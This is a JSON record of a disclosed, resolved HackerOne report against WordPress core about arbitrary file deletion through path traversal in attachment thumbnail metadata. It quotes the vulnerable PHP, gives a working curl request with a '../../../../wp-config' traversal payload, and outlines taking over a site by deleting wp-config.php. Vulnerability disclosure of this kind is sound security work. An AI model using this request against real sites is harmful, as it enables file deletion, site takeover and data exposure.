@@ -1,0 +1,136 @@
+{
+  "id": 291878,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTE4Nzg=",
+  "url": "https://hackerone.com/reports/291878",
+  "title": "Arbitrary file deletion in wp-core - guides towards RCE and information disclosure",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2017-11-20T13:57:40.409Z",
+  "submitted_at": "2017-11-20T13:57:40.409Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "b258ea62bf297b02afa9854",
+    "url": "/b258ea62bf297b02afa9854",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 55,
+    "url": "https://hackerone.com/wordpress",
+    "handle": "wordpress",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "WordPress",
+      "twitter_handle": "wordpress",
+      "website": "https://wordpress.org/",
+      "about": "Beautiful sites of any kind."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-08-29T13:47:04.950Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-07-30T13:47:01.536Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Vulnerable place 1: `wp-admin/post.php`\n`$newmeta['thumb']` is placed into DB not sanitized directly from user input.\n```\ncase 'editattachment':\n    check_admin_referer('update-post_' . $post_id);\n    // Don't let these be changed\n    unset($_POST['guid']);\n    $_POST['post_type'] = 'attachment';\n    // Update the thumbnail filename\n    $newmeta = wp_get_attachment_metadata( $post_id, true );\n    $newmeta['thumb'] = $_POST['thumb'];\n    wp_update_attachment_metadata( $post_id, $newmeta );\n``` \nVulnerable place 2: `wp_delete_attachment` \nThere we have `$meta = wp_get_attachment_metadata( $post_id );` and below in the code:\n```\nif ( ! empty($meta['thumb']) ) {\n        // Don't delete the thumb if another attachment uses it.\n        if (! $wpdb->get_row( $wpdb->prepare( \"SELECT meta_id FROM $wpdb->postmeta WHERE meta_key = '_wp_attachment_metadata' AND meta_value LIKE %s AND post_id <> %d\", '%' . $wpdb->esc_like( $meta['thumb'] ) . '%', $post_id)) ) {\n            $thumbfile = str_replace(basename($file), $meta['thumb'], $file);\n            /** This filter is documented in wp-includes/functions.php */\n            $thumbfile = apply_filters( 'wp_delete_file', $thumbfile );\n            @ unlink( path_join($uploadpath['basedir'], $thumbfile) );\n        }\n    }\n```\nThis means we can craft any value from the `wp-admin` for `thumb` property and that value to be sent towards `@unlink`\n\nHow to reproduce:\n\n1. Upload image via media menu e.g. new\n2. Go to edit post (old fashioned way)\n3. Grad the `id`, `_wpnonce` and choose your payload `../../../../wp-config.php`\n4. Craft your payload(set auth cookies, ua, referrers, ...): \n```\ncurl 'http://localhost/ripsa/wpvuln/wp-admin/post.php?post=[your_postid]&action=editattachment&_wpnonce=[yournonce]' -H 'place your client headers: ua, cookies in order to mimic the authenticated user ' -d 'thumb=../../../../wp-config-slavco.php' --compressed \n```\n5. Delete the file from the admin\n\nImpact:\n1. Requires user that have permission to manipulate media files / posts\n2. Hard to be spotted because:\n2.1 Payload is deleted from DB\n2.2 `@unlink` won't rise error in case of any failed attempts\n3. Affects many blogging/publishing, e-commerce, ...  setups.\n\nAttack:\n1. Delete `wp-config.php` and relaunch wp setup with remote attackers db - RCE \n2. Delete `.htaccess` or any another `index.html`/`index.php` in order to disclose any stored data under web accessible directory\n",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-08-29T13:47:01.687Z",
+  "allow_singular_disclosure_after": -242789802.01337215,
+  "singular_disclosure_allowed": true,
+  "vote_count": 17,
+  "voters": [
+    "inhibitor181",
+    "hunter",
+    "sameerphad72",
+    "mik317",
+    "savitar0x01",
+    "r4v",
+    "apapedulimu",
+    "muhammad_uwais",
+    "eveeez",
+    "cryptographer",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.9,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2750,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "WordPress Core",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
